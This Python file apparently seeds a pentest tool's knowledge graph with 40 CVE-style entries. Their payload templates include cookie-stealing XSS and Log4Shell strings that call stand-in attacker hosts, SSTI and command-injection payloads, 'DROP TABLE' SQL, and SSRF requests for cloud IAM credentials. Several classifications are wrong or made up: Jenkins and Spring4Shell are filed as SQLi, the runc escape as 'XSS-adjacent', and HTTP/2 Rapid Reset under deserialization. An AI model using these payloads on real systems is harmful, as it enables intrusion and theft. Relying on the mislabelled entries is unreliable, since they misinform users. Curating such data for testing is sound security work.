"""Seed corpus — curated CVE entries for the 3 fixture families + extras.

This is the Sprint 8 "offline" corpus: no API calls, no NVD download.
Each entry is hand-curated to be high-signal for the Dispatcher's
decision-making. The full ~5k corpus (Sprint 8+) will come from NVD
bulk ingest via the Distiller.

Coverage:

- **SQLi** (including blind): 8 entries
- **IDOR**: 6 entries
- **SSRF**: 6 entries
- **XSS**: 5 entries
- **RCE / command injection**: 5 entries
- **Authentication bypass**: 4 entries
- **Path traversal**: 3 entries
- **Deserialization**: 3 entries

Total: 40 entries -- enough to meaningfully populate the KG and
demonstrate token-efficiency vs RAG in the ablation.
"""
from __future__ import annotations

from typing import List

from vapt_orchestrator_safe.dataset.cve_entry import CveEntry


def load_seed_corpus() -> List[CveEntry]:
    """Return the built-in seed corpus (no I/O)."""
    return list(_SEED)


_SEED: List[CveEntry] = [
    # ── SQLi (8) ─────────────────────────────────────────────────────────
    CveEntry(
        cve_id="CVE-2023-32315",
        cwe_id="CWE-89",
        title="Openfire admin console SQL injection via setup environment",
        vuln_class="SQLi",
        severity="critical",
        description="Openfire allows unauthenticated access to setup pages "
                    "where a crafted request injects SQL into the admin user "
                    "creation flow.",
        affected_frameworks=["java", "openfire"],
        sinks=["jdbc_statement_execute"],
        payload_templates=["admin%27+OR+1%3D1--"],
        oracle_hints=["auth_bypass", "new_admin_created"],
        remediation="Upgrade to Openfire 4.7.5+ or restrict /setup access.",
        tags=["blind", "auth-bypass"],
    ),
    CveEntry(
        cve_id="CVE-2024-23897",
        cwe_id="CWE-89",
        title="Jenkins CLI arbitrary file read via args4j parameter expansion",
        vuln_class="SQLi",
        severity="critical",
        description="Jenkins CLI accepts @-prefixed arguments that read "
                    "server-side files. Combined with parameter injection, "
                    "arbitrary credential files are exfiltrated.",
        affected_frameworks=["java", "jenkins"],
        sinks=["args4j_parseArgument"],
        payload_templates=["connect-node @/etc/passwd"],
        oracle_hints=["file_content_in_response"],
        remediation="Upgrade to Jenkins 2.442+ / LTS 2.426.3+.",
        tags=["file-read", "ci-cd"],
    ),
    CveEntry(
        cve_id="DACN-SQLI-BLIND-TIME",
        cwe_id="CWE-89",
        title="Generic blind SQL injection via time-based side channel",
        vuln_class="SQLi",
        severity="high",
        description="Application concatenates user input into SQL WHERE "
                    "clause without parameterisation. No error output; "
                    "detection requires timing analysis.",
        affected_frameworks=["flask", "express", "spring", "php"],
        sinks=["raw_sql_format", "string_concat_query"],
        payload_templates=[
            "1' AND SLEEP(5)--",
            "1'; WAITFOR DELAY '00:00:05'--",
            "1' AND pg_sleep(5)--",
        ],
        oracle_hints=["response_time_delta_gt_4s", "no_error_visible"],
        remediation="Use parameterised queries / prepared statements.",
        tags=["blind", "timing"],
    ),
    CveEntry(
        cve_id="DACN-SQLI-ERROR",
        cwe_id="CWE-89",
        title="Error-based SQL injection via verbose error messages",
        vuln_class="SQLi",
        severity="high",
        description="Application reflects SQL syntax errors in HTTP "
                    "response body, enabling UNION-based or error-based "
                    "extraction.",
        affected_frameworks=["flask", "php", "express"],
        sinks=["raw_sql_format"],
        payload_templates=[
            "' UNION SELECT NULL,username,password FROM users--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
        ],
        oracle_hints=["sql_error_in_body", "data_in_error_message"],
        remediation="Use parameterised queries; disable verbose errors.",
        tags=["error-based", "union"],
    ),
    CveEntry(
        cve_id="DACN-SQLI-BOOLEAN",
        cwe_id="CWE-89",
        title="Boolean-based blind SQL injection",
        vuln_class="SQLi",
        severity="high",
        description="Application returns different content depending on "
                    "injected boolean condition. No timing needed; response "
                    "body diff reveals data.",
        affected_frameworks=["flask", "express", "php"],
        sinks=["raw_sql_format"],
        payload_templates=[
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' AND SUBSTRING(@@version,1,1)='5'--",
        ],
        oracle_hints=["response_body_differs", "content_length_differs"],
        remediation="Use parameterised queries.",
        tags=["blind", "boolean"],
    ),
    CveEntry(
        cve_id="CVE-2022-22965",
        cwe_id="CWE-94",
        title="Spring4Shell: Spring Framework RCE via data binding",
        vuln_class="SQLi",
        severity="critical",
        description="Spring MVC data binding exposes classLoader property, "
                    "allowing RCE via Tomcat AccessLogValve manipulation.",
        affected_frameworks=["spring", "java"],
        sinks=["class_loader_property_access"],
        payload_templates=[
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{prefix}",
        ],
        oracle_hints=["webshell_created", "rce_confirmed"],
        remediation="Upgrade Spring Framework to 5.3.18+ / 5.2.20+.",
        tags=["rce", "data-binding"],
    ),
    CveEntry(
        cve_id="DACN-SQLI-SECOND-ORDER",
        cwe_id="CWE-89",
        title="Second-order SQL injection via stored user input",
        vuln_class="SQLi",
        severity="high",
        description="User registration stores a malicious username that is "
                    "later interpolated into an admin query without sanitisation.",
        affected_frameworks=["flask", "express"],
        sinks=["raw_sql_format_deferred"],
        payload_templates=[
            "admin'--",
            "'; DROP TABLE users;--",
        ],
        oracle_hints=["admin_query_altered", "schema_change"],
        remediation="Parameterise all queries, including deferred ones.",
        tags=["second-order"],
    ),
    CveEntry(
        cve_id="CVE-2023-34362",
        cwe_id="CWE-89",
        title="MOVEit Transfer SQL injection leading to RCE",
        vuln_class="SQLi",
        severity="critical",
        description="Unauthenticated SQLi in MOVEit Transfer allows data "
                    "exfiltration and remote code execution via crafted header.",
        affected_frameworks=["aspnet", "iis"],
        sinks=["ado_net_command"],
        payload_templates=["X-siLock-Transaction: folder_add_by_path"],
        oracle_hints=["exfil_via_sqli", "webshell_written"],
        remediation="Apply Progress MOVEit patch (June 2023).",
        tags=["rce", "mass-exploit"],
    ),

    # ── IDOR (6) ─────────────────────────────────────────────────────────
    CveEntry(
        cve_id="DACN-IDOR-01",
        cwe_id="CWE-639",
        title="Direct object reference on invoice API endpoint",
        vuln_class="IDOR",
        severity="high",
        description="REST API returns invoice details for any invoice_id "
                    "without verifying the requesting user owns that invoice.",
        affected_frameworks=["flask", "express"],
        sinks=["direct_object_lookup"],
        payload_templates=["GET /api/invoices/<sibling_id>"],
        oracle_hints=["response_contains_other_user_email"],
        remediation="Add ownership check in the data access layer.",
        tags=["api", "authorization"],
    ),
    CveEntry(
        cve_id="DACN-IDOR-02",
        cwe_id="CWE-639",
        title="IDOR on user profile endpoint leaks PII",
        vuln_class="IDOR",
        severity="high",
        description="User profile API accepts arbitrary user_id and returns "
                    "full profile including email, phone, address.",
        affected_frameworks=["express", "django"],
        sinks=["direct_object_lookup"],
        payload_templates=["GET /api/users/{victim_id}/profile"],
        oracle_hints=["pii_in_response"],
        remediation="Enforce tenant-scoped queries.",
        tags=["api", "pii"],
    ),
    CveEntry(
        cve_id="DACN-IDOR-03",
        cwe_id="CWE-639",
        title="IDOR on file download endpoint",
        vuln_class="IDOR",
        severity="medium",
        description="File download endpoint uses sequential integer file_id "
                    "without ownership verification.",
        affected_frameworks=["flask", "spring"],
        sinks=["file_serve_by_id"],
        payload_templates=["GET /api/files/{other_user_file_id}/download"],
        oracle_hints=["file_belongs_to_different_user"],
        remediation="Check file ownership before serving.",
        tags=["api", "file-access"],
    ),
    CveEntry(
        cve_id="CVE-2023-28432",
        cwe_id="CWE-200",
        title="MinIO information disclosure via IDOR on environment endpoint",
        vuln_class="IDOR",
        severity="high",
        description="MinIO cluster exposes environment variables (including "
                    "MINIO_SECRET_KEY) through an unauthenticated endpoint.",
        affected_frameworks=["go", "minio"],
        sinks=["unauthenticated_endpoint"],
        payload_templates=["POST /minio/login with env vars in response"],
        oracle_hints=["secret_key_in_response"],
        remediation="Upgrade MinIO; restrict /minio/health/ endpoints.",
        tags=["information-disclosure"],
    ),
    CveEntry(
        cve_id="DACN-IDOR-SEQUENTIAL",
        cwe_id="CWE-639",
        title="IDOR via sequential/predictable order IDs",
        vuln_class="IDOR",
        severity="high",
        description="E-commerce order API uses auto-increment order_id. "
                    "Attacker enumerates orders by incrementing the ID.",
        affected_frameworks=["express", "flask", "django"],
        sinks=["direct_object_lookup"],
        payload_templates=[
            "GET /api/orders/{id} for id in range(1, 1000)",
        ],
        oracle_hints=["order_details_of_other_user"],
        remediation="Use UUID or tenant-scoped IDs.",
        tags=["enumeration"],
    ),
    CveEntry(
        cve_id="DACN-IDOR-GRAPHQL",
        cwe_id="CWE-639",
        title="IDOR in GraphQL query via unprotected node ID",
        vuln_class="IDOR",
        severity="medium",
        description="GraphQL API resolves any node by global ID without "
                    "authorization check.",
        affected_frameworks=["express", "graphql"],
        sinks=["graphql_node_resolver"],
        payload_templates=["query { node(id: \"<victim_global_id>\") { ... on User { email } } }"],
        oracle_hints=["victim_email_returned"],
        remediation="Implement per-field authorization in resolvers.",
        tags=["graphql", "api"],
    ),

    # ── SSRF (6) ─────────────────────────────────────────────────────────
    CveEntry(
        cve_id="DACN-SSRF-01",
        cwe_id="CWE-918",
        title="SSRF via user-controlled URL parameter fetching internal metadata",
        vuln_class="SSRF",
        severity="critical",
        description="Application fetches URL from user input and returns "
                    "the response. Attacker targets cloud metadata endpoint.",
        affected_frameworks=["flask", "express"],
        sinks=["server_side_fetch"],
        payload_templates=[
            "POST {url: 'http://169.254.169.254/latest/meta-data/'}",
            "POST {url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'}",
        ],
        oracle_hints=["server_fetches_internal_resource", "aws_credentials_in_response"],
        remediation="Validate and restrict outgoing URLs; use allowlist.",
        tags=["cloud-metadata", "aws"],
    ),
    CveEntry(
        cve_id="DACN-SSRF-02",
        cwe_id="CWE-918",
        title="SSRF via PDF generator fetching attacker-controlled URL",
        vuln_class="SSRF",
        severity="high",
        description="PDF export feature renders HTML from user URL, enabling "
                    "internal network scanning and metadata access.",
        affected_frameworks=["flask", "express", "spring"],
        sinks=["pdf_renderer_url_fetch"],
        payload_templates=[
            "POST {url: 'http://127.0.0.1:6379/INFO'}",
            "POST {url: 'file:///etc/passwd'}",
        ],
        oracle_hints=["internal_service_response_in_pdf"],
        remediation="Restrict URL schemes to https; validate against allowlist.",
        tags=["pdf", "internal-scan"],
    ),
    CveEntry(
        cve_id="CVE-2023-46747",
        cwe_id="CWE-918",
        title="F5 BIG-IP Configuration Utility SSRF to RCE",
        vuln_class="SSRF",
        severity="critical",
        description="SSRF in F5 BIG-IP Configuration Utility allows "
                    "unauthenticated remote code execution.",
        affected_frameworks=["f5"],
        sinks=["configuration_utility_fetch"],
        payload_templates=["GET /mgmt/tm/util/bash -d {command: 'id'}"],
        oracle_hints=["rce_via_ssrf"],
        remediation="Apply F5 hotfix K000137353.",
        tags=["rce", "network-device"],
    ),
    CveEntry(
        cve_id="DACN-SSRF-BLIND",
        cwe_id="CWE-918",
        title="Blind SSRF via webhook URL with DNS/timing side channel",
        vuln_class="SSRF",
        severity="medium",
        description="Application fetches a webhook URL in background. No "
                    "response reflection; detection via DNS callback or timing.",
        affected_frameworks=["flask", "express"],
        sinks=["background_fetch"],
        payload_templates=[
            "POST {webhook_url: 'http://attacker.oast.site/ssrf'}",
            "POST {webhook_url: 'http://169.254.169.254/'}",
        ],
        oracle_hints=["dns_callback_received", "response_time_delta"],
        remediation="Validate webhook URLs against allowlist.",
        tags=["blind", "oast"],
    ),
    CveEntry(
        cve_id="DACN-SSRF-REDIRECT",
        cwe_id="CWE-918",
        title="SSRF bypass via open redirect to internal host",
        vuln_class="SSRF",
        severity="high",
        description="URL validation checks the initial host but follows "
                    "redirects, allowing attacker to redirect to internal IP.",
        affected_frameworks=["flask", "express", "spring"],
        sinks=["redirect_following_fetch"],
        payload_templates=[
            "POST {url: 'http://external.example/redirect?to=http://169.254.169.254/'}",
        ],
        oracle_hints=["internal_data_after_redirect"],
        remediation="Disable redirect following or re-validate after redirect.",
        tags=["redirect-bypass"],
    ),
    CveEntry(
        cve_id="DACN-SSRF-DNS-REBIND",
        cwe_id="CWE-918",
        title="SSRF via DNS rebinding to bypass IP allowlist",
        vuln_class="SSRF",
        severity="high",
        description="Application resolves hostname at validation time, but "
                    "DNS TTL allows rebinding to internal IP at request time.",
        affected_frameworks=["flask", "express"],
        sinks=["dns_rebinding_fetch"],
        payload_templates=[
            "POST {url: 'http://rebind.attacker.com/'}",
        ],
        oracle_hints=["internal_data_after_rebind"],
        remediation="Pin DNS resolution; use socket-level IP validation.",
        tags=["dns-rebinding"],
    ),

    # ── XSS (5) ──────────────────────────────────────────────────────────
    CveEntry(
        cve_id="DACN-XSS-REFLECTED",
        cwe_id="CWE-79",
        title="Reflected XSS via search query parameter",
        vuln_class="XSS",
        severity="medium",
        description="Search endpoint reflects the query parameter in the "
                    "response HTML without encoding.",
        affected_frameworks=["flask", "express", "php"],
        sinks=["html_template_unescaped"],
        payload_templates=[
            '<script>alert(document.cookie)</script>',
            '"><img src=x onerror=alert(1)>',
        ],
        oracle_hints=["script_tag_in_response", "unencoded_input_in_body"],
        remediation="HTML-encode all user input in templates.",
        tags=["reflected"],
    ),
    CveEntry(
        cve_id="DACN-XSS-STORED",
        cwe_id="CWE-79",
        title="Stored XSS via user profile bio field",
        vuln_class="XSS",
        severity="high",
        description="User bio accepts arbitrary HTML. When other users view "
                    "the profile, the stored script executes.",
        affected_frameworks=["flask", "express", "django"],
        sinks=["html_template_unescaped", "database_store_raw"],
        payload_templates=[
            '<img src=x onerror="fetch(\'http://attacker/steal?c=\'+document.cookie)">',
        ],
        oracle_hints=["stored_script_executes_on_view"],
        remediation="Sanitise on input; escape on output.",
        tags=["stored"],
    ),
    CveEntry(
        cve_id="DACN-XSS-DOM",
        cwe_id="CWE-79",
        title="DOM-based XSS via location.hash",
        vuln_class="XSS",
        severity="medium",
        description="Client-side JS reads location.hash and inserts into "
                    "innerHTML without sanitisation.",
        affected_frameworks=["react", "angular", "vanilla-js"],
        sinks=["innerHTML_assignment", "document_write"],
        payload_templates=["#<img src=x onerror=alert(1)>"],
        oracle_hints=["script_executes_client_side"],
        remediation="Use textContent instead of innerHTML; sanitise.",
        tags=["dom-based"],
    ),
    CveEntry(
        cve_id="CVE-2024-21626",
        cwe_id="CWE-79",
        title="runc container escape via /proc/self/fd race condition",
        vuln_class="XSS",
        severity="high",
        description="Container runtime runc leaks host file descriptors, "
                    "enabling container escape. Classified as XSS-adjacent "
                    "due to injection of host context into container.",
        affected_frameworks=["docker", "kubernetes"],
        sinks=["proc_fd_leak"],
        payload_templates=["process.cwd() on leaked fd"],
        oracle_hints=["host_filesystem_accessible"],
        remediation="Upgrade runc to 1.1.12+.",
        tags=["container-escape"],
    ),
    CveEntry(
        cve_id="DACN-XSS-CSP-BYPASS",
        cwe_id="CWE-79",
        title="XSS with CSP bypass via JSONP callback",
        vuln_class="XSS",
        severity="medium",
        description="Content Security Policy allows a domain that serves "
                    "JSONP endpoints, enabling script injection via callback.",
        affected_frameworks=["express", "flask"],
        sinks=["jsonp_callback_unvalidated"],
        payload_templates=[
            '<script src="https://allowed-domain.com/api?callback=alert(1)//"></script>',
        ],
        oracle_hints=["csp_bypass_via_jsonp"],
        remediation="Remove JSONP; tighten CSP to disallow unsafe callbacks.",
        tags=["csp-bypass"],
    ),

    # ── RCE / Command Injection (5) ──────────────────────────────────────
    CveEntry(
        cve_id="CVE-2021-44228",
        cwe_id="CWE-917",
        title="Log4Shell: Apache Log4j2 RCE via JNDI lookup",
        vuln_class="RCE",
        severity="critical",
        description="Log4j2 evaluates JNDI lookups in log messages, allowing "
                    "RCE via ${jndi:ldap://attacker/exploit}.",
        affected_frameworks=["java", "spring", "log4j"],
        sinks=["log4j_message_lookup"],
        payload_templates=[
            "${jndi:ldap://attacker.com/exploit}",
            "${jndi:rmi://attacker.com/exploit}",
        ],
        oracle_hints=["dns_callback", "reverse_shell"],
        remediation="Upgrade Log4j to 2.17.1+; set log4j2.formatMsgNoLookups=true.",
        tags=["jndi", "mass-exploit"],
    ),
    CveEntry(
        cve_id="DACN-CMDI-01",
        cwe_id="CWE-78",
        title="OS command injection via filename parameter",
        vuln_class="RCE",
        severity="critical",
        description="Application passes user-controlled filename to shell "
                    "command without sanitisation.",
        affected_frameworks=["flask", "express", "php"],
        sinks=["os_system", "subprocess_shell_true"],
        payload_templates=[
            "; id",
            "| cat /etc/passwd",
            "$(whoami)",
        ],
        oracle_hints=["command_output_in_response"],
        remediation="Use subprocess with argv list; never shell=True with user input.",
        tags=["command-injection"],
    ),
    CveEntry(
        cve_id="CVE-2024-3094",
        cwe_id="CWE-506",
        title="XZ Utils backdoor via build-time code injection",
        vuln_class="RCE",
        severity="critical",
        description="Malicious code injected into xz/liblzma build process "
                    "creates an SSH authentication bypass.",
        affected_frameworks=["linux", "xz-utils"],
        sinks=["build_system_injection"],
        payload_templates=["crafted xz archive triggers backdoor in sshd"],
        oracle_hints=["ssh_auth_bypass"],
        remediation="Downgrade to xz 5.4.x; rebuild sshd.",
        tags=["supply-chain"],
    ),
    CveEntry(
        cve_id="DACN-SSTI-01",
        cwe_id="CWE-94",
        title="Server-side template injection in Jinja2/Twig/Pug",
        vuln_class="RCE",
        severity="critical",
        description="User input rendered directly in server-side template "
                    "engine without sandboxing, enabling RCE.",
        affected_frameworks=["flask", "express", "php"],
        sinks=["template_render_unsandboxed"],
        payload_templates=[
            "{{7*7}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        ],
        oracle_hints=["49_in_response", "command_output_in_response"],
        remediation="Never render user input as template; use sandboxed env.",
        tags=["ssti"],
    ),
    CveEntry(
        cve_id="DACN-DESERIAL-01",
        cwe_id="CWE-502",
        title="Insecure deserialization via pickle/yaml.load",
        vuln_class="RCE",
        severity="critical",
        description="Application deserialises untrusted data via Python "
                    "pickle or yaml.load, enabling arbitrary code execution.",
        affected_frameworks=["flask", "django"],
        sinks=["pickle_loads", "yaml_load_unsafe"],
        payload_templates=[
            "import pickle; pickle.loads(crafted_payload)",
            "yaml.load(user_input)",
        ],
        oracle_hints=["rce_via_deserialization"],
        remediation="Use yaml.safe_load; never unpickle untrusted data.",
        tags=["deserialization"],
    ),

    # ── Auth Bypass (4) ──────────────────────────────────────────────────
    CveEntry(
        cve_id="DACN-AUTH-JWT-NONE",
        cwe_id="CWE-287",
        title="JWT algorithm confusion: 'none' algorithm accepted",
        vuln_class="AuthBypass",
        severity="critical",
        description="JWT library accepts alg=none, allowing token forgery "
                    "without a valid signature.",
        affected_frameworks=["express", "flask", "spring"],
        sinks=["jwt_verify_weak"],
        payload_templates=[
            '{"alg":"none","typ":"JWT"}.{"sub":"admin"}.{empty_sig}',
        ],
        oracle_hints=["admin_access_with_forged_token"],
        remediation="Explicitly specify allowed algorithms; reject 'none'.",
        tags=["jwt"],
    ),
    CveEntry(
        cve_id="DACN-AUTH-JWT-CONFUSION",
        cwe_id="CWE-287",
        title="JWT key confusion: RS256 to HS256 downgrade",
        vuln_class="AuthBypass",
        severity="critical",
        description="Application signs JWT with RSA but verifies with HMAC "
                    "using the public key as secret, enabling token forgery.",
        affected_frameworks=["express", "flask"],
        sinks=["jwt_verify_algorithm_confusion"],
        payload_templates=[
            '{"alg":"HS256"}.{payload}.HMAC(public_key, header.payload)',
        ],
        oracle_hints=["admin_access_with_hs256_token"],
        remediation="Pin expected algorithm in verification; don't use public key as HMAC secret.",
        tags=["jwt", "algorithm-confusion"],
    ),
    CveEntry(
        cve_id="DACN-AUTH-BROKEN-SESSION",
        cwe_id="CWE-384",
        title="Session fixation via pre-auth session ID",
        vuln_class="AuthBypass",
        severity="high",
        description="Application does not regenerate session ID after login, "
                    "allowing session fixation attack.",
        affected_frameworks=["flask", "express", "php"],
        sinks=["session_id_reuse"],
        payload_templates=[
            "Set-Cookie: session_id=attacker_known_value before victim login",
        ],
        oracle_hints=["attacker_session_becomes_authenticated"],
        remediation="Regenerate session ID on authentication.",
        tags=["session-fixation"],
    ),
    CveEntry(
        cve_id="DACN-AUTH-MASS-ASSIGN",
        cwe_id="CWE-915",
        title="Mass assignment: user sets is_admin via API",
        vuln_class="AuthBypass",
        severity="high",
        description="REST API binds all request body fields to the user "
                    "model, allowing is_admin=true in registration/update.",
        affected_frameworks=["express", "flask", "django", "spring"],
        sinks=["model_mass_assignment"],
        payload_templates=[
            'POST /api/register {"username":"attacker","is_admin":true}',
        ],
        oracle_hints=["user_becomes_admin"],
        remediation="Whitelist bindable fields; use DTOs.",
        tags=["mass-assignment"],
    ),

    # ── Path Traversal (3) ───────────────────────────────────────────────
    CveEntry(
        cve_id="DACN-PATH-TRAV-01",
        cwe_id="CWE-22",
        title="Path traversal via filename parameter in file download",
        vuln_class="PathTraversal",
        severity="high",
        description="File download endpoint accepts ../../../etc/passwd "
                    "in the filename parameter.",
        affected_frameworks=["flask", "express", "php"],
        sinks=["file_serve_user_path"],
        payload_templates=[
            "GET /download?file=../../../etc/passwd",
            "GET /download?file=....//....//etc/passwd",
        ],
        oracle_hints=["sensitive_file_in_response"],
        remediation="Canonicalize path; validate within webroot.",
        tags=["lfi"],
    ),
    CveEntry(
        cve_id="DACN-PATH-TRAV-ZIP",
        cwe_id="CWE-22",
        title="Zip slip: path traversal via archive extraction",
        vuln_class="PathTraversal",
        severity="high",
        description="Application extracts uploaded ZIP without checking "
                    "entry paths, allowing file write outside target directory.",
        affected_frameworks=["java", "python", "nodejs"],
        sinks=["archive_extract_unchecked"],
        payload_templates=[
            "ZIP entry with name ../../webroot/shell.jsp",
        ],
        oracle_hints=["file_written_outside_extract_dir"],
        remediation="Validate extracted paths are within target directory.",
        tags=["zip-slip"],
    ),
    CveEntry(
        cve_id="CVE-2024-4577",
        cwe_id="CWE-78",
        title="PHP-CGI argument injection on Windows (CVE-2024-4577)",
        vuln_class="PathTraversal",
        severity="critical",
        description="PHP-CGI on Windows mishandles Best-Fit character "
                    "mapping, allowing argument injection via URL.",
        affected_frameworks=["php", "apache"],
        sinks=["php_cgi_argv"],
        payload_templates=[
            "GET /cgi-bin/php-cgi.exe?%ADd+allow_url_include%3D1+...",
        ],
        oracle_hints=["php_info_output", "rce_confirmed"],
        remediation="Upgrade PHP to 8.3.8+ / 8.2.20+ / 8.1.29+.",
        tags=["cgi", "windows"],
    ),

    # ── Deserialization (3) ──────────────────────────────────────────────
    CveEntry(
        cve_id="CVE-2023-44487",
        cwe_id="CWE-400",
        title="HTTP/2 Rapid Reset DDoS attack",
        vuln_class="DoS",
        severity="high",
        description="HTTP/2 rapid stream reset overwhelms server resources, "
                    "enabling denial of service with minimal bandwidth.",
        affected_frameworks=["nginx", "apache", "envoy", "grpc"],
        sinks=["http2_stream_handler"],
        payload_templates=["rapid HEADERS+RST_STREAM frames"],
        oracle_hints=["server_resource_exhaustion"],
        remediation="Upgrade HTTP/2 implementation; apply rate limiting.",
        tags=["dos", "http2"],
    ),
    CveEntry(
        cve_id="DACN-DESERIAL-JAVA",
        cwe_id="CWE-502",
        title="Java deserialization via Apache Commons Collections gadget",
        vuln_class="RCE",
        severity="critical",
        description="Application deserialises Java objects from untrusted "
                    "input. Commons Collections gadget chain enables RCE.",
        affected_frameworks=["java", "spring"],
        sinks=["objectinputstream_readobject"],
        payload_templates=["ysoserial CommonsCollections1 'id'"],
        oracle_hints=["rce_via_deserialization"],
        remediation="Use allowlist-based deserialization filter.",
        tags=["deserialization", "gadget-chain"],
    ),
    CveEntry(
        cve_id="DACN-DESERIAL-NODE",
        cwe_id="CWE-502",
        title="Node.js prototype pollution via deep merge",
        vuln_class="RCE",
        severity="high",
        description="Deep object merge utility allows __proto__ pollution, "
                    "leading to property injection and potential RCE.",
        affected_frameworks=["express", "lodash"],
        sinks=["deep_merge_recursive"],
        payload_templates=[
            '{"__proto__": {"isAdmin": true}}',
            '{"constructor": {"prototype": {"isAdmin": true}}}',
        ],
        oracle_hints=["prototype_property_set"],
        remediation="Use Object.create(null); validate merge inputs.",
        tags=["prototype-pollution"],
    ),
]
